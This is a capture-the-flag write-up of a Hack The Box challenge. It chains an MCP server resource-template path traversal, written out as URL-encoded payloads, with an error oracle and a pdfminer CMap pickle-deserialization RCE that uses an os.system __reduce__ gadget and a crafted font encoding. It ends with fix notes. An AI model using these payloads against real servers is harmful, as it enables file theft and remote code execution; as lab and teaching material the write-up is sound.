---
title: "HTB SecFest'26 — Neon Registry: MCP Path-Traversal → pdfminer CMap Pickle RCE → SUID /readflag"
platform: Hack The Box
event: "SecFest'26 Capture the Flag"
challenge: Neon Registry
app: "FastMCP 'Neon Jobs MCP' server (HTTP/SSE, FastAPI+uvicorn, Python 3.13) — recruitment Oracle with resume upload and job apply"
category: AI/ML
difficulty: hard
points: 975
status: complete
type: writeup
instance: "154.57.164.78:39419/mcp — hosted MCP server; flag from the SUID /readflag binary, submitted on the HTB panel"
mitre: []
tags:
  - writeup
  - HTB
  - Security
  - Web_App_Security
  - mcp
  - path-traversal
  - deserialization
  - rce
related:
  - "[[HTB-SecFest26-Re-Cars-AI-Chatbot-Output-Filter-Bypass-Delimiter-Injection]]"
  - "[[HTB-SecFest26-Stock-Signals-AI-Bot-Fake-System-Update-Tier-Escalation]]"
  - "[[HTB-SecFest26-Cosmic-Crisis-LLM-Priority-Classifier-Baseline-Severity-Description]]"
aliases:
  - Neon Registry
  - SecFest26 Neon Registry
  - Neon Jobs MCP
created: 2026-10-29T02:46:31.918Z
updated: 2026-10-29T02:52:32.434Z
---

# Neon Registry — MCP Path-Traversal → pdfminer CMap Pickle RCE → SUID /readflag

> [!success] Solved — 2026-10-28 22:45 (platform timestamp)
> **Scenario Pwned.** Flag: `HTB{m1n1ng_my_w4y_1n70_mcP}`
> Full chain: unauthenticated MCP resource-template **path traversal** (arbitrary file read as `www`) → source disclosure → **insecure pickle deserialization** in a git-checkout pdfminer.six (`CMapDB._load_data`), reached by planting a gzipped pickle via `upload_resume` and a crafted PDF → **RCE as www** → execute the **SUID-root `/readflag`**.

> [!info] Scenario, verbatim
> In an ambitious effort to rebuild the workforce of the post-collapse era, Neo-Yokado's authorities launched the Neon Registry — an experimental Model-Context Protocol (MCP) interface designed to streamline recruitment for the great Techno-Clans. However, this rushed deployment has left the city's digital heartbeat critically exposed. … As the provisional Red Team operative, your objective is to beat the enemy to the punch by conducting a full-spectrum penetration test on this MCP server. Can you inspect the system, find flaws to exploit, cause errors, bleed hidden data, and ultimately demonstrate a catastrophic compromise before the city falls back into digital anarchy?
>
> Difficulty hard · 975 pts · 400 XP. Flag format `HTB{...}`.

> [!warning] Do not run the suggested client config
> The landing page tells you to add the server to Claude Desktop / Cursor via `npx -y @modelcontextprotocol/server-sse <url>`. Don't — that executes an npm package on your own box to reach an attacker-adjacent target. Speak to the server directly over JSON-RPC (HTTP/SSE) instead; no client install needed.

## 0. How the flag was obtained (the four stages)

1. **Inspect** — MCP `initialize` (HTTP/SSE), then `tools/list`, `resources/list`, `resources/templates/list`, `prompts/list`. Surface: 2 tools (`upload_resume`, `job_apply`), 3 resources (`registry://status|resume|jobs`), 1 template (`registry://jobs/{resource_file}`), 2 prompts.
2. **Bleed data (path traversal)** — `registry://jobs/{resource_file}` reads `/app/jobs/<name>` with no sanitization. Raw `../` is normalized away, but **URL-encoded `%2e%2e%2f` is not** → arbitrary file read as `www`. Dumped all source, `/etc/passwd`, `/proc/self/environ`, `/proc/mounts`.
3. **Cause errors (oracle)** — `get_job_details` calls `ctx.debug(f"Error: {e}")`, which streams the real exception back over SSE. The `Errno` distinguishes absent (`2`) / permission-denied (`13`) / is-a-directory (`21`), which located the SUID **`/readflag`** and proved no flag file is `www`-readable.
4. **Catastrophic compromise (RCE)** — pdfminer runs from a git checkout at `/opt/git/pdfminer.six`. `CMapDB._load_data` does `pickle.loads(gzip.open(name + ".pickle.gz"))` with `name` taken from a PDF font `/Encoding`, unsanitized. Plant a gzipped pickle via `upload_resume`, upload a crafted PDF whose Type0 font names that absolute pickle path, call `get_resume` → `pdf2txt.py` deserializes it → runs `/readflag` (SUID root) → flag.

## 1. The MCP server

HTTP transport, SSE. `initialize` → `serverInfo {"name":"Neon Jobs MCP","version":"2.13.0.2"}` (FastMCP 2.13.0.2, uvicorn, Python 3.13.7). Session handshake: `POST /mcp` with `Accept: application/json, text/event-stream`; the server returns an `mcp-session-id` header that must be echoed on later calls. A bare `GET /mcp` without the session id returns `-32600 Missing session ID` — not an auth control, just transport state.

Attack surface:

| Kind | Name | Notes |
|---|---|---|
| tool | `upload_resume(name, content_b64)` | writes base64 bytes to `/app/neon_resume_uploads/<sanitized>`. **The write primitive.** |
| tool | `job_apply(job_id)` | just inserts an `Approved` row — **no LLM**, despite the "Oracle evaluates your resume" flavor. |
| resource | `registry://status` | current user `neo_73` (hardcoded), affiliation, applications. |
| resource | `registry://resume` | reads the stored resume; **if `.pdf`, runs `pdf2txt.py`**. The command sink. |
| resource | `registry://jobs` | lists 5 open jobs from SQLite. |
| template | `registry://jobs/{resource_file}` | `open("/app/jobs/"+resource_file).read()` — **the traversal.** |
| prompt | `neo_yokado_resume_writer`, `shogun_interview_prep` | static system-prompt strings; not flag-bearing. |

## 2. Path traversal — arbitrary file read as `www`

```python
@mcp.resource("registry://jobs/{resource_file}")
async def get_job_details(resource_file, ctx):
    file_path = get_storage_path(JOB_POSTINGS_DIR) / resource_file   # Path("/app")/"jobs" / name
    with open(file_path, "r") as f:
        return f.read()
    except Exception as e:
        await ctx.debug(f"Error: {e}")           # <-- leaks the real exception
        return "Error: Job file not found in Oracle archives."
```

The MCP URI router collapses a literal `../`, and a literal extra `/` makes the template miss ("Unknown resource"). The bypass: **URL-encode every slash** so the value stays one template segment, then gets decoded into a traversal path:

- `registry://jobs/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` → `/etc/passwd` ✔
- Base path leaked by the debug line: files are read from `/app/jobs/`.

Encoding rule used throughout: `../` → `%2e%2e%2f`, and any remaining `/` → `%2f`. From `/app/jobs`, three `%2e%2e%2f` clamp to `/`.

Read this way: `app.py`, `config.py`, `mcp_server.py`, `mcp_logger.py`, `db.py` (full source), `requirements.txt`, `/etc/passwd` (user `www`, uid 1000, home `/home/www`), `/proc/self/environ`, `/proc/self/cmdline` (`python3 /app/app.py`), `/etc/supervisord.conf` (one program, `mcp-server`, run as `www`), `/logs/nginx-access.log`.

## 3. The error oracle

The `ctx.debug` leak turns the read into an existence/permission oracle:

| Response debug | Meaning |
|---|---|
| `[Errno 2] No such file or directory` | absent |
| `[Errno 13] Permission denied` | exists but not readable by `www` (e.g. `/root/*`, `/etc/shadow`) |
| `[Errno 21] Is a directory` | it's a directory |
| `'utf-8' codec can't decode byte 0x90` | exists, binary (how `/readflag` was spotted) |

Findings: `/flag.txt`, `/app/flag.txt` genuinely **absent**; `/root/*` **denied**; `/readflag` exists and is an **ELF**. No `www`-readable flag file anywhere — so the flag is root-only behind the SUID `/readflag`, and the finale must be **code execution**.

## 4. The RCE — pdfminer CMap pickle deserialization

`registry://resume` converts PDFs:

```python
if filename.lower().endswith('.pdf'):
    result = subprocess.run(['pdf2txt.py', str(file_path)], capture_output=True, text=True, timeout=30)
    ...
    await ctx.debug(f"pdf2txt.py error: {result.stderr}")   # leaks tracebacks too
```

`subprocess` is list-form (no shell injection), filename is sanitized (no arg injection). But a malformed PDF leaked a traceback locating pdfminer at **`/opt/git/pdfminer.six/`** — a deliberately placed git checkout. Its `cmapdb.py`:

```python
@classmethod
def _load_data(cls, name):
    name = name.replace("\0", "")                 # ONLY null-stripping
    filename = "%s.pickle.gz" % name
    cmap_paths = (os.environ.get("CMAP_PATH","/usr/share/pdfminer/"),
                  os.path.join(os.path.dirname(__file__), "cmap"))
    for directory in cmap_paths:
        path = os.path.join(directory, filename)  # absolute `name` -> join DISCARDS `directory`
        if os.path.exists(path):
            gzfile = gzip.open(path)
            return type(str(name), (), pickle.loads(gzfile.read()))   # <-- RCE
```

`name` comes from a PDF composite-font `/Encoding` (via `PDFCIDFont.get_cmap_from_spec` → `CMapDB.get_cmap`). It is **not** sanitized for traversal, and because `os.path.join(dir, "/abs/path")` returns the absolute path, a PDF can name an **absolute** `.pickle.gz` on disk. With `upload_resume` able to write that file, the chain is:

**Step A — the pickle gadget** (gzipped):
```python
class E:
    def __reduce__(self):
        return (os.system, ("/readflag > /app/neon_resume_uploads/pwn 2>&1; id >> ...; ls -la / >> ...",))
# gzip.compress(pickle.dumps(E()))  ->  upload as "payload.pickle.gz"
```
`pickle.loads` runs `os.system` during load (RCE); the follow-on `type(name,(),0)` raises a harmless `TypeError` — *after* the command has run. Seeing that `TypeError: ... argument 3 must be dict, not int` in the trace is the confirmation it fired.

**Step B — the trigger PDF.** A minimal valid PDF (needs a real `/Root`) with a Type0 font whose `/Encoding` is the absolute pickle path **minus** the `.pickle.gz` suffix pdfminer appends, with `/` hex-escaped as `#2F` so `literal_name` decodes it back:
```
/Encoding /#2Fapp#2Fneon_resume_uploads#2Fpayload   % => /app/neon_resume_uploads/payload
```
Plus a `CIDFontType2` descendant and a content stream that selects the font (`/F1 Tf (A) Tj`) so pdfminer instantiates it during extraction.

**Step C — fire.** `upload_resume("payload.pickle.gz", …)` (writes the pickle), `upload_resume("exploit.pdf", …)` (writes the PDF and points the resume record at it), then read `registry://resume` → `pdf2txt.py` parses the PDF → `get_cmap(absolute_path)` → `_load_data` → `pickle.loads` → **`/readflag`** runs. Read the output back:

```
registry://jobs/%2e%2e%2fneon_resume_uploads%2fpwn   ->   /app/neon_resume_uploads/pwn
```

Result:
```
HTB{m1n1ng_my_w4y_1n70_mcP}
---id---      uid=1000(www) gid=1000(www) groups=1000(www)
---ls /---    -rwsr-sr-x 1 root root 18544 readflag      # SUID root => returns the root-only flag
```

## 5. Why each guard failed
- **Traversal:** normalization ran on the raw value only; URL-decoding happened after, so `%2e%2e%2f` slipped the check. The `/app/jobs` prefix was never re-validated against the resolved path.
- **Filename sanitization worked** (write confined to the uploads dir) — but it didn't need to be bypassed; the uploads dir is a perfectly good place to stage a pickle whose *absolute path* the PDF names.
- **Deserialization:** a pinned, vulnerable pdfminer was shipped on purpose; `CMapDB` trusts a PDF-controlled name and `pickle.loads` of the file it points to.
- **Privilege:** the flag is root-only, bridged by a SUID `/readflag` — so RCE as the low-priv `www` is sufficient; no kernel/privesc needed.

## 6. Framework mapping
- **MITRE ATT&CK:** `mitre: []` — this is application-logic, but the closest techniques are **T1083** (File and Directory Discovery) / traversal read, **T1190** (Exploit Public-Facing Application), **T1203**-style deserialization code execution. Left empty in frontmatter by vault convention for app-logic web flaws.
- **OWASP:** A01 Broken Access Control / path traversal; **A08 Software and Data Integrity Failures** (insecure deserialization); A06 Vulnerable & Outdated Components (pinned vulnerable pdfminer).
- **CWE:** CWE-22 (path traversal), CWE-502 (deserialization of untrusted data), CWE-209 (error-message info exposure), CWE-250/SUID exposure.
- **MCP-specific:** an MCP *resource template* is an unauthenticated file-read endpoint; an MCP *tool* that writes files is a write primitive. Tool/resource descriptions are not a trust boundary.

- **Lockheed Martin Cyber Kill Chain:** a web-app exploitation chain, so the later implant/kinetic phases don't all map — stated honestly rather than forced:
  1. **Reconnaissance** — MCP `initialize` + `tools/list` / `resources/list` / `resources/templates/list` / `prompts/list`, then the traversal source read mapped the whole app (§1–§2).
  2. **Weaponization** — built the gzipped `__reduce__` pickle gadget and the trigger PDF (Type0 font whose `/Encoding` names the absolute pickle path) (§4 A–B).
  3. **Delivery** — `upload_resume` wrote both the pickle and the PDF into `/app/neon_resume_uploads/` (§4 C).
  4. **Exploitation** — `get_resume` → `pdf2txt.py` → `CMapDB._load_data` `pickle.loads` → code execution as `www` (§4); the §2 traversal is itself exploitation of the resource template.
  5. **Installation** — not performed. The staged `payload.pickle.gz` is a transient exploit artifact, not persistence; no implant, backdoor, or account was planted.
  6. **Command & Control** — not applicable. Single-shot RCE; output was exfiltrated to a world-readable file and read back over the existing traversal, with no C2 channel.
  7. **Actions on Objectives** — ran the SUID-root `/readflag` and recovered the root-only flag; the §2 source and credential-file disclosure is the secondary "bleed hidden data" objective.

## 7. Fix notes (pentest deliverable)
- **Resolve-and-confirm paths.** `p = (JOBS_DIR / resource_file).resolve(); assert str(p).startswith(str(JOBS_DIR.resolve()))`, and decode before validating. Reject names containing separators outright.
- **Don't deserialize untrusted input.** Pin a patched pdfminer.six (the CMap-name pickle traversal is fixed upstream by sanitizing the name), or don't run `pdf2txt.py` on attacker-supplied PDFs; parse in a locked-down sandbox with no write access to the uploads dir.
- **Don't leak exceptions.** `ctx.debug(f"Error: {e}")` built the oracle; log server-side only, return a generic message.
- **Drop privilege / remove SUID.** A SUID-root `/readflag` makes low-priv RCE game-over; gate the flag behind a real auth boundary instead.
- **Treat MCP endpoints as a real attack surface** — authenticate the session, authorize per-resource, validate every template parameter.

## 8. Method notes
- **Enumerate the MCP fully first** (tools + resources + templates + prompts). The templated resource was the whole game.
- **Pull the source before theorizing.** The traversal read gave every file; the RCE fell straight out of reading `cmapdb.py`, no guessing.
- **Turn verbose errors into an oracle.** The `Errno` leak classified every path and found `/readflag` and the pdfminer location (via a deliberately malformed PDF's traceback).
- **`os.path.join(dir, abs)` discards `dir`** — the key primitive that made an *absolute* CMap name point anywhere.
- **A harmless post-exploit `TypeError` is still success** — the `pickle.loads` side effect runs before the return value is used.

## 9. Open items / notes
- The flag file `/readflag` reads was never located directly (root-only; likely `/root/flag.txt`); unnecessary once RCE runs the SUID helper.
- `job_apply`'s "Oracle evaluates your resume" is pure flavor — no LLM server-side (confirmed in source and by the single-process supervisor config). Unlike the other SecFest AI rooms, nothing here is actually prompt-injection; the "AI/ML" label is thematic. The real bugs are classic web (traversal) + deserialization RCE.
- FastMCP `2.13.0.2`, pdfminer.six from `/opt/git` (unsanitized `CMapDB`), Python 3.13.7, uvicorn, supervisord (single program as `www`), k8s-hosted.

## Cross-references
- [[HTB-SecFest26-Re-Cars-AI-Chatbot-Output-Filter-Bypass-Delimiter-Injection]] — SecFest'26 AI room (output-filter bypass)
- [[HTB-SecFest26-Stock-Signals-AI-Bot-Fake-System-Update-Tier-Escalation]] — SecFest'26 AI room (model-side authz bypass); the only other room here that's genuinely LLM-exploitation
- [[HTB-SecFest26-Cosmic-Crisis-LLM-Priority-Classifier-Baseline-Severity-Description]] — SecFest'26 AI room (classifier, solved by baseline)

## Change Log
- 2026-10-29 — Note created after the solve. Documents the four-stage chain: MCP enumeration, URL-encoded path-traversal arbitrary read as `www`, the `ctx.debug` error oracle (locating the SUID `/readflag`), and the pdfminer `CMapDB._load_data` pickle-deserialization RCE (planted gzipped pickle via `upload_resume` + crafted Type0-font PDF naming the absolute pickle path) executing SUID `/readflag`. Includes framework mapping, fix notes, method notes, open items. `status: complete`.
- 2026-10-29 — Added a Lockheed Martin Cyber Kill Chain mapping to §6 (Framework mapping), stage-by-stage, with Installation and C2 marked not-performed/not-applicable for this web-exploitation chain.
